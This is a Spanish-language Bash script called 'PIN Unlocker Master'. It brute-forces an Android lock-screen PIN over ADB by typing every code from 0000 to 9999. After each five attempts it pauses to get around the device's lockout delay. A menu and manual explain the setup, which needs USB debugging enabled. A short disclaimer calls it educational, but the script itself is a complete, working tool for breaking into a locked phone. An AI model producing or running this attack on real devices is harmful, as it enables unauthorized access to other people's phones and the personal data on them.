#Programa creado por Kristian Gz

option=0
intents=0
inc=0

function start() {

echo -e " \e[1;34m
 -----------------------------------------
 ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
 ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
 ⬢⬢⬢⬢⬢⬢⬢⬢                        ⬢⬢⬢⬢⬢⬢⬢⬢
 ⬢⬢⬢⬢⬢⬢⬢⬢   \e[7;31mPIN Unlocker Master\e[0m \e[3;34m ⬢⬢⬢⬢⬢⬢⬢⬢
 ⬢⬢⬢⬢⬢⬢⬢⬢                        ⬢⬢⬢⬢⬢⬢⬢⬢
 ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
 ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
 -----------------------------------------\e[0m"
echo -e "			 \e[1;34mPor: Kristian Gz\e[0m"
echo
echo " Programa creado con fines didacticos, los creadores no nos hacemos
 cargo por los daños ocacionados ni damos soporte para ello, Gracias."
echo
echo
echo " Seleccione una opcion: " 
echo
echo -e " \e[1;34m[1]\e[0m Empezar Ataque"
echo -e " \e[1;34m[2]\e[0m Ayuda y Manual"
echo
echo -e " \e[1;34m[0]\e[0m Salir"
echo
((option=0))
read -p " Opcion: " option

}
clear && start
function manual() {
	echo -e " \e[1;34mAYUDA Y MANUAL DE PIN Unlocker Master\e[0m"
	echo -e " \e[1;34m#####################################\e[0m"
	echo
	echo -e "
 PIN Unlocker Master Es una aplicacion que te ayudara a desbloquear mediante fuerza
 bruta el Pin de la pantalla de bloqueo de tu celular, cabe decir que
 para que el programa funcione a la perfeccion se necesita:
 
\e[1;34m
 	- Un celular Bloqueado (Con contraseña tipo PIN)
 	- Que el celular tenga la Depuracion USB activada
 	- Tener el ADB instalado en su Terminal\e[0m
 	  (Instalar el ADB) apt install adb -y
 	
 	
 	\e[0;35mFacil, no? :b\e[0m
 
 
 
 Pasos para empezar a Hackear el LockScreen del celular:
\e[1;34m 

 	1- Conecte el celular a su PC mediante un cable USB.
 
 	2- Apague la pantalla de su celular y dejelo en un sitio apartado de cualquier
   	   golpe que pueda desconectar el cable o interrumpir el proceso
 
 	3- Abra PIN Unlocker Master y elija la opcion [1] (Empezar Ataque) para cargar el sistema
 
 	4- Espere a que el proceso termine y se desloquee su dispositivo
 
 	5- Recuerde que este proceso puede tardar horas o incluso hasta un dia
   	   sea paciente...\e[0m
 
 Cualquier problema o sugerencia por favor hagamelo saber a: ?????????????????????
 
 \e[0;35mConsejo: Recuerde que este proceso varia dependiendo del modelo del celular y de la version
 de android, no damos un 100% de seguridad de que su dispositivo se desbloquee\e[0m
 
 Gracias por usar PIN Unlocker Master.
 
 
 
	"
echo -e " \e[1;35mPresione [ENTER] para retroceder\e[0m"
read -p " "
bash Home.sh


}

function unlock() {

	echo
	echo " INICIANDO PROCESO DE PIN CON FUERZA BRUTA"
	echo -e " \e[1;34m#########################################\e[0m"
	sleep 2
	echo
	
	echo -e " \e[1;34m[+]\e[0m Iniciando proceso ADB"
	sleep 2
	
	if ! command -v adb == &> /dev/null 
	then echo -e " \e[0;31m[-]\e[0m ADB no instalado en /usr/bin/adb, se requiere ADB para continuar, Saliendo..." && echo " " && exit
	else Devices=`adb devices`  
	sleep 1
	echo -e " \e[1;34m[+]\e[0m ADB cargado correctamente"
	fi
	
	sleep 2
	
	if [[ $Devices == *"	device"* ]]; then
	echo -e " \e[1;34m[+]\e[0m Dispositivo conectado y cargado correctamente"
	else
	echo -e " \e[0;31m[-]\e[0m No hay ningun dispositivo Conectado o hay mas de 1, verifiquelo y desconecte los sobrantes" && echo " Saliendo..." && echo " " && exit
	fi
	
	sleep 2
	echo -e " \e[1;34m[+]\e[0m Encendiendo pantalla del Dispositivo"
	adb shell input keyevent 82
	
	sleep 1
	echo -e " \e[1;34m[+]\e[0m Desbloqueando pantalla"
	adb shell input swipe 407 1211 378 85
	echo -e " \e[1;34m[+]\e[0m Iniciando Ataque"
	sleep 1
	
	clear
	
	for intents in {0000..9999}; do
	sleep 0.3
	inc=$(expr $inc + 1) 
	if [ $inc == "5" ]; then
	clear
	echo -e "
  ATACANDO LOCK SCREEN
 \e[1;34m#########################################\e[0m
 	
 	Probando PIN: $intents
 	Intentos: $inc
	Esperando 30 segundos de Inactividad...
	
"	
	adb shell input text "$intents"
	adb shell input keyevent 66
	sleep 31
	adb shell input keyevent 82
	adb shell input swipe 407 1211 378 85
	inc=$(expr $inc = 0)
	else
	clear
	echo -e "
  ATACANDO LOCK SCREEN
 \e[1;34m#########################################\e[0m
 
	Probando PIN: $intents
 	Intentos: $inc
 	
"
	adb shell input text "$intents"
	adb shell input keyevent 66
	
	fi
	done
}

function selected() {	
	case $option in
	"2") clear && manual
	;;
	"1") clear && unlock
	;;
	"0") clear && echo " " && echo " Hasta pronto = ^v^ =" && echo
	;;
	*) clear && bash Home.sh
	esac
	
}
selected
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
